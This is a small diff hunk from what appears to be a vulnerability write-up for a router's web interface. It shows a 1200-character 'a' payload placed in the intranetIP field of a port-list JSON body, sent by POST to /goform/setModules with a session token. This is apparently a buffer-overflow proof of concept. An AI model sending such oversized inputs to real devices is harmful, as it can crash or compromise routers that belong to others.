@@ -27,6 +27,7 @@ IV：EU5H62G9ICGRNI43
 Unencrypted data：
 
 payload = 'a'*1200
+
 {"intranetIP":"{payload}","intranetPort":"80","extranetPort":"8080","protocol":"tcp"}}
 ```
 POST /;stok=a74261ba42fdea698945280e143761d2/goform/setModules?modules=portList HTTP/1.1
